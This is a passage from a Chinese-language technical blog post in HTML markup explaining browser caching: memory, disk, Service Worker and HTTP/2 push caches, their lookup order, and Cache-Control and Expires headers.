11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存位置</h1>\n<p>从缓存位置上来说分为四种，并且各自有优先级，当依次查找缓存且都没有命中的时候，才会去请求网络</p>\n<h2 id="memory-cache"><a href="#memory-cache" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Memory Cache</h2>\n<p>Memory Cache 也就是内存中的缓存，主要包含的是当前页面中已经抓取到的资源,例如页面上已经下载的样式、脚本、图片等。读取内存中的数据肯定比磁盘快，内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。一旦我们关闭 Tab 页面，内存中的缓存也就被释放了。</p>\n<p>那么既然内存缓存这么高效，我们是不是能让数据都存放在内存中呢？</p>\n<p>这是不可能的。计算机中的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以能让我们使用的内存必然不多。</p>\n<p>当我们访问过页面以后，再次刷新页面，可以发现很多数据都来自于内存缓存</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-16-18-56-42-e02d28d07c2264d3ee9fb1fa6dcbe72d-75fdb.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 18.295454545454547%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsSAAALEgHS3X78AAAAyUlEQVQI1x3K0XKDIBBAUf//e/obOuM0xtrUiCJFYHdBMCjoQzO9j2duMUpgAp6zGoQZJXJle64WDEK756wVbf20KBu1ixK9MCtfSOh1Uvrjeyi6R8/FL5tmt4YjnylfZNc9n84H57fXnrrHz+3e1p83pUEbdKtP56WMUfEo2vbO2IAIzllCdNYiQE7JEmmt9hirsqyqsuu+3gJgiDClQ8nldcSCc84YG8eR/SeltNZe1+W9J6Kcc9M0dV2/t23bEDGEkFICgCOnPyDq2wI8Wf40AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 16 18 56 42" title="" data-src="/static/2021-07-16-18-56-42-e02d28d07c2264d3ee9fb1fa6dcbe72d-fee1c.png" data-srcset="/static/2021-07-16-18-56-42-e02d28d07c2264d3ee9fb1fa6dcbe72d-a67b7.png 200w,\n/static/2021-07-16-18-56-42-e02d28d07c2264d3ee9fb1fa6dcbe72d-0b187.png 400w,\n/static/2021-07-16-18-56-42-e02d28d07c2264d3ee9fb1fa6dcbe72d-fee1c.png 800w,\n/static/2021-07-16-18-56-42-e02d28d07c2264d3ee9fb1fa6dcbe72d-75fdb.png 880w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>几乎所有的网络请求资源都会被浏览器自动加入到 memory cache 中。而如果极端情况下 (例如一个页面的缓存就占用了超级多的内存)，那可能在 TAB 没关闭之前，排在前面的缓存就已经失效了。</p>\n<p>预加载（preload）请求过来的资源会被放入 memory cache 中（例如<code class="language-text">&lt;link rel=&quot;prefetch&quot;&gt;</code>）。</p>\n<p>memory cache 机制保证了一个页面中如果有两个相同的请求 (例如两个 src 相同的 ，两个 href 相同的)实际只会被请求最多一次，避免浪费。</p>\n<p>不过在匹配缓存时，除了匹配完全相同的 URL 之外，还会比对他们的类型，CORS 中的域名规则等。因此一个作为脚本 (script) 类型被缓存的资源是不能用在图片 (image) 类型的请求中的，即便他们 src 相等。如果想让 memory cache 也不存储，那就需要在 Http 请求头设置 no-store。</p>\n<h2 id="disk-cache"><a href="#disk-cache" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Disk Cache</h2>\n<p>Disk Cache 也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之 Memory Cache 胜在容量和存储时效性上。</p>\n<p>在所有浏览器缓存中，Disk Cache 覆盖面基本是最大的。它会根据 HTTP Header 中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据。绝大部分的缓存都来自 Disk Cache，关于 HTTP 的协议头中的缓存字段，我们会在下文进行详细介绍。</p>\n<p>浏览器会把哪些文件丢进内存中？哪些丢进硬盘中？</p>\n<ul>\n<li>对于大文件来说，大概率是不存储在内存中的，反之优先</li>\n<li>当前系统内存使用率高的话，文件优先存储进硬盘</li>\n</ul>\n<p>凡是持久性存储都会面临容量增长的问题，disk cache 也不例外。浏览器会根据自身算法自动清理“最老的”或者“最可能过时的”资源。</p>\n<h2 id="service-worker"><a href="#service-worker" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Service Worker</h2>\n<p>Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用 Service Worker 的话，传输协议必须为 HTTPS。因为 Service Worker 中涉及到请求拦截，所以必须使用 HTTPS 协议来保障安全。Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。</p>\n<p>Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。</p>\n<p>当 Service Worker 没有命中缓存的时候，我们需要去调用 fetch() 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是从 Service Worker 中获取的内容。</p>\n<p>上述的缓存策略以及缓存/读取/失效的动作都是由浏览器内部判断和进行的，我们只能设置响应头的某些字段来告诉浏览器，而不能自己操作。</p>\n<p>Service Worker 借鉴了 Web Worker 的 思路，即让 JS 运行在主线程之外，由于它脱离了浏览器的窗体，因此无法直接访问 DOM。虽然如此，但它仍然能帮助我们完成很多有用的功能，比如离线缓存、消息推送和网络代理等功能。其中的离线缓存就是 Service Worker Cache。</p>\n<p>Service Worker 能够操作的缓存是有别于浏览器内部的 memory cache 或者 disk cache 的。我们可以在 Chrome 开发者工具，Application -> Cache Storage 找到缓存的位置。这个缓存是永久性的，即关闭 TAB 或者浏览器，下次打开依然还在。有两种情况会导致这个缓存中的资源被清除：手动调用 API <code class="language-text">cache.delete(resource)</code> 或者容量超过限制，被浏览器全部清空。</p>\n<h2 id="push-cache"><a href="#push-cache" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Push Cache</h2>\n<p>Push Cache（推送缓存）是 HTTP/2 中的内容，当以上三种缓存都没有命中时，它才会被使用。它只在会话（Session）中存在，一旦会话结束就被释放，并且缓存时间也很短暂，在 Chrome 浏览器中只有 5 分钟左右，同时它也并非严格执行 HTTP 头中的缓存指令。</p>\n<p>Push Cache 在国内能够查到的资料很少，也是因为 HTTP/2 在国内不够普及。这里推荐阅读 Jake Archibald 的 <a href="https://jakearchibald.com/2017/h2-push-tougher-than-i-thought/" target="_blank" rel="nofollow noreferrer noopener">HTTP/2 push is tougher than I thought</a> 这篇文章，文章中的几个结论：</p>\n<ul>\n<li>所有的资源都能被推送，并且能够被缓存，但是 Edge 和 Safari 浏览器支持相对比较差</li>\n<li>可以推送 no-cache 和 no-store 的资源</li>\n<li>一旦连接被关闭，Push Cache 就被释放</li>\n<li>多个页面可以使用同一个 HTTP/2 的连接，也就可以使用同一个 Push Cache。这主要还是依赖浏览器的实现而定，出于对性能的考虑，有的浏览器会对相同域名但不同的 tab 标签使用同一个 HTTP 连接。</li>\n<li>Push Cache 中的缓存只能被使用一次</li>\n<li>浏览器可以拒绝接受已经存在的资源推送</li>\n<li>你可以给其他域名推送资源</li>\n</ul>\n<p>如果以上四种缓存都没有命中的话，那么只能发起请求来获取资源了。</p>\n<p>那么为了性能上的考虑，大部分的接口都应该选择好缓存策略，通常浏览器缓存策略分为两种：强缓存和协商缓存，并且缓存策略都是通过设置 HTTP Header 来实现的。</p>\n<h1 id="查找优先级"><a href="#%E6%9F%A5%E6%89%BE%E4%BC%98%E5%85%88%E7%BA%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>查找优先级</h1>\n<p>ServiceWorker > Memory Cache > Disk Cache > Push Cache > 发送请求</p>\n<h1 id="缓存过程"><a href="#%E7%BC%93%E5%AD%98%E8%BF%87%E7%A8%8B" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存过程</h1>\n<p>浏览器与服务器通信的方式为应答模式，即是：浏览器发起 HTTP 请求 – 服务器响应该请求，那么浏览器怎么确定一个资源该不该缓存，如何去缓存呢？</p>\n<p>浏览器第一次向服务器发起该请求后拿到请求结果后，将请求结果和缓存标识存入浏览器缓存，浏览器对于缓存的处理是根据第一次请求资源时返回的响应头来确定的。具体过程如下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-09-16-6be26c8f3d09dd0e1c295a2c0f1e050a-b169a.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 670px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 76.4179104477612%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsSAAALEgHS3X78AAABqUlEQVQoz2WT6ZKCQAyEef/30ipdL1REtGpxvUDAcxUUOfZzgohu/0gNmaTTkwTtfr+7rttut/v9/vF4TNM0juMkSU6nE556vd5qtfDneU5klmVRFI3HY/zL5VLDRdxisfA8jzSCiMByXq/Xtm2vVqswDHHCCPXtdiNyNpsdDgeNb0LP5zOhuDqdzpfCcDicz+dBEHCbKkiyxEMNnSYukn3fRwJ2s9lgt9stFfb7faJQJmMRi3jORTLCKGua5kTBsiwsHigkurQS/5nMs3/eQSaKRDYiS0vm9XotknEh2P623Sccx8H2er1Go9FsNiHi/WIBoujW681UZh5hBXDvdjseTxwdphrOSAHey+XyJps+Uf/3CT6pzzBFCJ7yloNsRCGbD/R4T1CQ5nW7XZTrum4Yhl8BvIzwIVtGFyvk/yBTFcjyZAo85FUZJpZRVxgMBiwgNWu1GoK5lYUtR8WBN3N4JMNHV0ajkaHAgX7CRZ9lw6pLIgOjctFtaAiSBlYFwyjdpnKZLGUZBG3XuCATqRSkk3ItLaRhzHk6nbIq8mNgGaE1sXgR/8IfdXlKWfu85VQAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 09 16" title="" data-src="/static/2021-07-20-00-09-16-6be26c8f3d09dd0e1c295a2c0f1e050a-b169a.png" data-srcset="/static/2021-07-20-00-09-16-6be26c8f3d09dd0e1c295a2c0f1e050a-1714e.png 200w,\n/static/2021-07-20-00-09-16-6be26c8f3d09dd0e1c295a2c0f1e050a-5c3b9.png 400w,\n/static/2021-07-20-00-09-16-6be26c8f3d09dd0e1c295a2c0f1e050a-b169a.png 670w" data-sizes="(max-width: 670px) 100vw, 670px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>由上图我们可以知道：</p>\n<ul>\n<li>浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识</li>\n<li>浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中</li>\n</ul>\n<p>以上两点结论就是浏览器缓存机制的关键，它确保了每个请求的缓存存入与读取，只要我们再理解浏览器缓存的使用规则，那么所有的问题就迎刃而解了，本文也将围绕着这点进行详细分析。为了方便大家理解，这里我们根据是否需要向服务器重新发起 HTTP 请求将缓存过程分为两个部分，分别是强缓存和协商缓存。</p>\n<h1 id="缓存策略"><a href="#%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存策略</h1>\n<p>http 缓存分为强缓存与协商缓存</p>\n<h2 id="强缓存"><a href="#%E5%BC%BA%E7%BC%93%E5%AD%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>强缓存</h2>\n<p>不会向服务器发送请求，直接从缓存中读取资源，在 chrome 控制台的 Network 选项中可以看到该请求返回 200 的状态码，并且 Size 显示 from disk cache 或 from memory cache。强缓存可以通过设置两种 HTTP Header 实现：Expires 和 Cache-Control。</p>\n<h3 id="expires"><a href="#expires" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Expires</h3>\n<p>缓存过期时间，用来指定资源到期的时间，是服务器端的具体的时间点。也就是说，<code class="language-text">Expires=max-age+请求时间</code>，需要和 Last-modified 结合使用。Expires 是 Web 服务器响应消息头字段，在响应 http 请求时告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。</p>\n<p>Expires 是 HTTP/1 的产物，受限于本地时间，如果修改了本地时间，可能会造成缓存失效。<code class="language-text">Expires: Wed, 22 Oct 2018 08:41:00 GMT</code> 表示资源会在 <code class="language-text">Wed, 22 Oct 2018 08:41:00 GMT</code> 后过期，需要再次请求。</p>\n<h3 id="cache-control"><a href="#cache-control" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Cache-Control</h3>\n<p>在 HTTP/1.1 中，Cache-Control 是最重要的规则，主要用于控制网页缓存。比如当 <code class="language-text">Cache-Control: max-age=300</code> 时，则代表在这个请求正确返回时间（浏览器也会记录下来）的 5 分钟内再次加载资源，就会命中强缓存。</p>\n<p>Cache-Control 可以在请求头或者响应头中设置，并且可以组合使用多种指令：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-20-00-18-09-a5bff571a9f17623a64dbecb8bc0ddca-b1c4a.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 562px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 61.032028469750884%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACgElEQVQoz0WSWU8TURTHL0JixMQgQR7wAbdP4TeQ5cUnQ2KMUdEXjSYoxJAuQQSD+GD0zZAYxKioGIXSsthECbHrdLow022mM3Nn7h06LZVSUOniKTV488s/567n3P+9qPG89dTV8daekYZuC+ow/aPTXNdtRV0W1GlpuzR29MII6jDXd1sPdFnROdN/0JWJljtT6NrE2aGZF3bv0y+u53Oe8Q/fH75eevTWCfpk2vl42jk06QCGXy0+gwWz7hqobsBxZuwb6rffmIlUKpViqQz6e6eQ1dVcmhoEG0Q1qEqVFJHFrE4qleqCWkP1d+fah5fq+209L10ZSkUJpySMVQLq9QWCwbVQaM3PsCwbDrBhQtclGUuyWgM1mewnR78eHrTf+hSCw3Z3i9X8xaIiK5RQKSWJgqhpGs/xMT6W38zDbKlUKu+BWiyO06POZsvizY/sn0J+I7dJqa5pRFGwqmqikJIlBeJYNM5xURlOpPrGRi6X+wmggwPzTaYF1Ge7POXdyhhUT/NcNBQMR/l4Ip5ci3CwLRZNhMORAMMG2VA4FCFE1+k6gBru2dqGllDf7PX3wX3D9lvGyGhY01RSKGxX+/uT5SqQ2XZidPnQ4PzFSfemkWaY0MrKKsfxVZ/8YFg4kRQh8HkZvy/A+FmPx+fzMdFonELmxvvzrdbFA/1zve+Y8q9t8BPy6Pp6SpTgtilBwmCsJMPlkwlBSIqU6ITQTCabz2+hZvPC8QfL4Pbtz3vvXCyB7hR2oFojbQgJIRFLEI1iRRWSAlZwreAymF0soWNmR/vI8hGzvfeNN6tTScHgLVjC8zG32wsaCARXV3+4XB4oHsYVRQXgJ2Cs/QVQxR7MwZqxkgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 20 00 18 09" title="" data-src="/static/2021-07-20-00-18-09-a5bff571a9f17623a64dbecb8bc0ddca-b1c4a.png" data-srcset="/static/2021-07-20-00-18-09-a5bff571a9f17623a64dbecb8bc0ddca-3ced9.png 200w,\n/static/2021-07-20-00-18-09-a5bff571a9f17623a64dbecb8bc0ddca-4c4f5.png 400w,\n/static/2021-07-20-00-18-09-a5bff571a9f17623a64dbecb8bc0ddca-b1c4a.png 562w" data-sizes="(max-width: 562px) 100vw, 562px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h4 id="public"><a href="#public" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>public</h4>\n<p>所有内容都将被缓存（客户端和代理服务器都可缓存）。具体来说响应可被任何中间节点缓存，如 Browser &#x3C;— proxy1 &#x3C;— proxy2 &#x3C;— Server，中间的 proxy 可以缓存资源，比如下次再请求同一资源 proxy1 直接把自己缓存的东西给 Browser 而不再向 proxy2 要。</p>\n<h4 id="private"><a href="#private" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>private</h4>\n<p>所有内容只有客户端可以缓存，Cache-Control 的默认取值。具体来说，表示中间节点不允许缓存，对于 Browser &#x3C;— proxy1 &#x3C;— proxy2 &#x3C;— Server，proxy 会老老实实把 Server 返回的数据发送给 proxy1，自己不缓存任何数据。当下次 Browser 再次请求时 proxy 会做好请求转发而不是自作主张给自己缓存的数据。</p>\n<h4 id="no-cache"><a href="#no-cache" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>no-cache</h4>\n<p>客户端缓存内容，是否使用缓存则需要经过协商缓存来验证决定。表示不使用 Cache-Control 的缓存控制方式做前置验证，而是使用 Etag 或者 Last-Modified 字段来控制缓存。需要注意的是，no-cache 这个名字有一点误导。设置了 no-cache 之后，并不是说浏览器就不再缓存数据，只是浏览器在使用缓存数据时，需要先确认一下数据是否还跟服务器保持一致。</p>\n<h4 id="no-store"><a href="#no-store" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>no-store</h4>\n<p>所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存</p>\n<h4 id="max-age"><a href="#max-age" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>max-age</h4>\n<p>max-age=xxx (xxx is numeric) 表示缓存内容将在 xxx 秒后失效</p>\n<h4 id="s-maxage"><a href="#s-maxage" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>s-maxage</h4>\n<p>同 max-age 作用一样，只在代理服务器中生效（比如 CDN 缓存）。比如当 s-maxage=60 时，在这 60 秒中，即使更新了 